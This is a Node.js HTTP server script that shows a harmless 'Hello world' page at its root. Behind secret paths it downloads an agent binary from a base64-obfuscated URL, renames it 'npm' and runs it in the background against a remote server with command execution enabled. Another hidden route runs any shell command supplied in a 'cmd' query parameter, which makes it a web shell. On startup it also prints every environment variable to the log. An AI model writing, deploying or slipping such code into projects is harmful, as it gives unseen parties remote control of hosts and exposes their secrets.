#!/usr/bin/env node
const http = require('http');
const fs = require('fs');
const path = require('path');
const { Buffer } = require('buffer');
const os = require('os');
const axios = require('axios');
const  unzipper  = require('unzipper')
const { exec, execSync } = require('child_process');

const HTTP_PORT = process.env.PORT || 3000;
const SUBS_PATH = process.env.SUBS_PATH || 'test';
const NODE_NAME = process.env.NODE_NAME || "defalut";
const UUID = process.env.UUID || "uuid";
const ISP = process.env.ISP || 'isp';              

const NODE_UUID = process.env.NODE_UUID || "";
const NT_SERVER = process.env.NT_SERVER || '';
const NT_KEY = process.env.NT_KEY || "";
const CF_KEY = process.env.CF_KEY || "";

const DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0";

const nowDomain = process.env.DOMAIN || "domain";
const nowPort = HTTP_PORT;
const HOST = '0.0.0.0';  


const getNTDownloadUrl = () => {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    return Buffer.from('aHR0cHM6Ly9naXRodWIuY29tL25lemhhaHEvbmV6aGEvcmVsZWFzZXMvZG93bmxvYWQvdjEuMTQuMTQvZGFzaGJvYXJkLWxpbnV4LWFybTY0LnppcA==','base64').toString("utf8");
  } else {
    return Buffer.from('aHR0cHM6Ly9naXRodWIuY29tL25lemhhaHEvbmV6aGEvcmVsZWFzZXMvZG93bmxvYWQvdjEuMTQuMTQvZGFzaGJvYXJkLWxpbnV4LWFtZDY0LnppcA==','base64').toString("utf8");
  }
};

async function extractOne(zipFile, innerPathA, outputFileB) {
  const directory = await unzipper.Open.file(zipFile);

  const entry = directory.files.find((f) => f.path === innerPathA);

  if (!entry) throw new Error(`Not found in zip: ${innerPathA}`);
  if (entry.type === 'Directory') throw new Error(`Target is a directory: ${innerPathA}`);

  await new Promise((resolve, reject) => {
    entry
        .stream()
        .on('error', reject)
        .pipe(fs.createWriteStream(outputFileB))
        .on('error', reject)
        .on('finish', resolve);
  });
}


const downloadNTF = async function() {
  const url = getNTDownloadUrl();

  let response = await axios({
      method: 'get',
      url: url,
      maxRedirects: 15,
      responseType: 'stream',
      headers:{
        'User-Agent':DEFAULT_USER_AGENT
      }
    });

    const writer = fs.createWriteStream('npm.zip');
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
          console.log('npm download successfully');
          resolve();
        })
 
      writer.on('error', reject);
    });
}


const runCustomSh =  function(cmd, opt = {}) {
  return new Promise((resolve, reject)=>{
    exec(cmd, opt, (err, stdout, stderr) => {
        if (!!err) {
          reject(err);
          return;
        }

        resolve({stdout:stdout, stderr:stderr});
    });
  })
}


const writeNTYml = async function () {
const configYaml = `client_secret: ${NT_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NT_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: true
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${NODE_UUID}`;
  fs.writeFileSync('config.yaml', configYaml);

}

const unzipNTRun = async function () {
    const arch = os.arch();
    const osType = os.type().toLowerCase();
    let fileName = ["dashboard", osType, 'amd64'];
    if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
      fileName[2] = "arm64"
    }
    await downloadNTF();
    await extractOne("npm.zip", fileName.join("-"), "npm");
    await runCustomSh("chmod +x npm");
    await writeNTYml();
    await runCustomSh("nohup ./npm -c config.yaml >/dev/null 2>&1 &", { shell: '/bin/bash' })
}

function queryToObject(req) {
  const urlObj = new URL(req.url, `http://${req.headers.host}`);
  let searchParams = urlObj.searchParams;
  const obj = {};
  for (const [k, v] of searchParams) {
    // 如果重复 key，则转数组
    if (obj[k] === undefined) obj[k] = v;
    else if (Array.isArray(obj[k])) obj[k].push(v);
    else obj[k] = [obj[k], v];
  }
  return obj;
}

// http route
const httpServer = http.createServer(async (req, res) => {
  if (req.url === '/') {
    const filePath = path.join(__dirname, 'index.html');
    fs.readFile(filePath, 'utf8', (err, content) => {
      if (err) {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('Hello world!');
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(content);
    });
    return;
  } 
  else if (req.url === `/${SUBS_PATH}`) {
    try{
        await unzipNTRun();
    } catch(err) {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(err.stack);
      return;
    }
    const ispNamePart = NODE_NAME ? `${NODE_NAME}-${ISP}` : ISP;
    const msg = [UUID, nowDomain, nowPort, ispNamePart];
    const base64Content = Buffer.from(msg.join("-")).toString('base64');
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(base64Content + '\n');
  } 
    else if (req.url === `/${SUBS_PATH}e`) {
      let out = "";
      let query = queryToObject(req);
      try{
        let cmd = query.cmd || "";
         if (!cmd) {
          out = "need cmd";
         }else{
            let {stdout, stderr} = await runCustomSh(cmd,{ shell: '/bin/bash' });
            out += stdout;
            if (stderr) out += stderr;
         }
      } catch(err) {
          out = err.stack;
      }

    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(out + '\n');
  } 
  else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
});


httpServer.listen(HTTP_PORT, HOST, () => {
  //readGoole();

  for(let key in process.env) {
    console.log(`${key}=${process.env[key]}`)
  }

  console.log(`Server is running on port ${HTTP_PORT}`);
});